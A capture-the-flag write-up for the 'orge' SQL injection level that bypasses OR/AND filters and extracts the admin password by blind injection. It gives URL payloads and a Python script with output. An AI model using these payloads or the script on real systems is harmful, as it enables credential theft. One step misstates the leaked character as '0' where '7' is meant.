---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 7
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/b4a2f5ed-77f8-4b4a-aaae-220bf30b6964)

We are provided with the SQL query:

```sql
SELECT id FROM prob_orge WHERE id='guest' AND pw='{$_GET[pw]}'
```

The code performs two conditional checks:

1. `if($result['id'])`: It checks if the statement is `True`. If yes, it prints the message `Hello {$result[id]}`
2. `if(($result['pw']) && ($result['pw'] == $_GET['pw']))`: It then checks if the `pw` that is provided is correct. If yes, it prints the flag.


It is similar to [orc](https://writeups-kunull.vercel.app/Lord%20of%20SQLInjection/orc) but this level also blocks the `OR` and `AND` characters. So we will haveto use their alternatives `||` and `&&` respectively.

In order to print out the flag, we need to first know the password. We have to perform a Blind SQL Injection.

### Blind SQL Injection

First we have to reveal the length of the flag.

If we provide the following URI:

```
?pw=' || id='admin' %26%26 length(pw)=1 -- -
```

The resultant query becomes:

```sql
SELECT id FROM prob_orge WHERE id='admin' || pw='' && length(pw)=1 -- -'

## Queried part:
SELECT id FROM prob_orge WHERE id='admin' || pw='' && length(pw)=1

## Commented part:
'
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/54dd9da3-f4bc-425a-99aa-719ad27b3fba)

Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.

That tells us that the length of the `pw` column is more than 1.

If we keep increasing the length and provide the following URI:

```
?pw=' || id='admin' %26%26 length(pw)=8 -- -
```

The resultant query becomes:

```sql
SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && length(pw)=8 -- -''

## Queried part:
SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && length(pw)=8

## Commented part:
'
```

![3](https://github.com/Kunull/Write-ups/assets/110326359/4239c4cf-ee50-4569-ba04-c53e6763f684)

Since the `Hello admin` message is printed, we know that the resultant query resulted in `True`.

That tells us that the length of the `pw` column is 8.

### Leaking the password

Next, we can leak the password byte by byte using the `substr()` function.

#### `substr()`

![Pasted image 20240610125927](https://github.com/Kunull/Write-ups/assets/110326359/1f746f94-b19a-4867-8868-f8396aa3e375)

If we provide the following URI:

```
?pw=' || id='admin' %26%26 substr(pw, 1, 1)='0' -- -
```

The resultant query becomes:

```sql
SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && substr(pw, 1, 1)='0' -- -'

## Queried part:
SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && substr(pw, 1, 1)='0'

## Commented part:
'
```

![4](https://github.com/Kunull/Write-ups/assets/110326359/e90ce2aa-7d48-46da-b082-bad77687875b)

Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.

That tells us that the first character of the `pw` for `id=admin` is not `0`.

We can try other characters moving up to the following:

```
?pw=' || id='admin' %26%26 substr(pw, 1, 1)='7' -- -
```

The resultant query becomes:

```sql
SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && substr(pw, 1, 1)='7' -- -'

## Queried part:
SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && substr(pw, 1, 1)='7'

## Commented part:
'
```

![5](https://github.com/Kunull/Write-ups/assets/110326359/6cb53029-51de-43bd-9456-d62d95321eca)

Since the `Hello admin` message is printed, we know that the resultant query resulted in `True`.

That tells us that the first character of the `pw` for `id=admin` is `0`.

We can move onto the next characters:

```
?pw=' || id='admin' %26%26 substr(pw, 2, 1)='0' -- -
```

The resultant query becomes:

```sql
SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && substr(pw, 2, 1)='0' -- -'

## Queried part:
SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && substr(pw, 2, 1)='0'

## Commented part:
'
```

![6](https://github.com/Kunull/Write-ups/assets/110326359/57096134-2e7f-4417-a442-d2cd1c2ad761)

Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.

That tells us that the second character of the `pw` for `id=admin` is not `0`.

We can keep repeating this process until we get all the eight characters of the `admin` password:

```
7b751aec
```

Now, we can provide password URI:

```
?pw=7b751aec
```

The resultant query becomes:

```sql
SELECT id FROM prob_orge WHERE id='admin' AND pw='7b751aec'
```


## Script

We can automate the entire process using a script.

```py title="orge_script.py"
import requests
import urllib.parse
import string

cookies = {'PHPSESSID': 'jeae4igtrh2cq92r63ob4kqmqr'}
url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
password_length = 0

for x in range(0, 10):
  payload = f"' || id='admin' && length(pw)={x} -- -"
  encoded_payload = urllib.parse.quote_plus(payload)
  full_url = f"{url}?pw={encoded_payload}"
    
  response = requests.get(full_url, cookies=cookies)
    
  if "Hello admin" in response.text:
    password_length = x
    break

print()    
print(f"[!] Payload: ?pw={payload}")
print(f"[!] Password length: {password_length}")
print()

password = ""
searchspace = string.digits + string.ascii_letters

for index in range(1, password_length + 1):
  for char in searchspace:
    payload = f"' || id='admin' && substr(pw, {index}, 1)='{char}' -- -"
    encoded_payload = urllib.parse.quote_plus(payload)
    full_url = f"{url}?pw={encoded_payload}"

    response = requests.get(full_url, cookies=cookies)

    if "Hello admin" in response.text:
      password += char
      print(f"[+] Payload: ?pw={payload}")
      print(f"[+] Character at index {index}: {char}")
      break

print()
print(f"[!] Extracted Password: {password}")
print(f"[!] Final payload: ?pw={password}")
```

```
$ python .\orge_script.py

[!] Payload: ?pw=' || id='admin' && length(pw)=8 -- -
[!] Password length: 8

[+] Payload: ?pw=' || id='admin' && substr(pw, 1, 1)='7' -- -
[+] Character at index 1: 7
[+] Payload: ?pw=' || id='admin' && substr(pw, 2, 1)='b' -- -
[+] Character at index 2: b
[+] Payload: ?pw=' || id='admin' && substr(pw, 3, 1)='7' -- -
[+] Character at index 3: 7
[+] Payload: ?pw=' || id='admin' && substr(pw, 4, 1)='5' -- -
[+] Character at index 4: 5
[+] Payload: ?pw=' || id='admin' && substr(pw, 5, 1)='1' -- -
[+] Character at index 5: 1
[+] Payload: ?pw=' || id='admin' && substr(pw, 6, 1)='a' -- -
[+] Character at index 6: a
[+] Payload: ?pw=' || id='admin' && substr(pw, 7, 1)='e' -- -
[+] Character at index 7: e
[+] Payload: ?pw=' || id='admin' && substr(pw, 8, 1)='c' -- -
[+] Character at index 8: c     

[!] Extracted Password: 7b751aec
[!] Final payload: ?pw=7b751aec 
```
